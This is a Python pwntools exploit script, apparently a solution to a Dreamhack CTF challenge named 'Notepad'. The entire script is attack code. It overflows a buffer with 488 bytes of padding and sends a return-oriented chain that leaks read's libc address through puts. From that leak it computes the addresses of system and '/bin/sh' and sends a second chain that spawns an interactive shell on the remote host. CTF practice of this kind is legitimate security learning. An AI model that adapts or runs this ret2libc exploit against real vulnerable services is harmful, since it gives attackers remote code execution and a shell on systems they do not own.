from pwn import *
context.update(arch='amd64', os='linux')

c = remote("host3.dreamhack.games", 11979)
#c = process("./Notepad")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

c.sendafter(b"-----Enter the content-----\n", b"`")
#pop rdi; ret 0x400c73
pr = 0x400c73
read_got = 0x602040
put_plt = 0x400730
main = 0x400957

payload = p64(pr)+p64(read_got)+p64(put_plt)+p64(main)
payload = b"a"*488 + payload
c.sendafter(b"-----Leave a message-----\n", payload)

c.recvuntil(b"Bye Bye!!:-)\n")
libc_base = u64(c.recv(6)+b"\x00\x00")-libc.sym['read']
print("libc_base : "+hex(libc_base))

system = libc_base + libc.sym['system']
print(f"system : {hex(system)}")
binsh = libc_base+list(libc.search(b'/bin/sh'))[0]
print(f"binsh : {hex(binsh)}")

payload2 = p64(pr)+p64(binsh)+p64(system)
payload2 = b"a"*488 + payload2

c.sendafter(b"-----Enter the content-----\n", b"`")

c.sendafter(b"-----Leave a message-----\n", payload2)
c.interactive()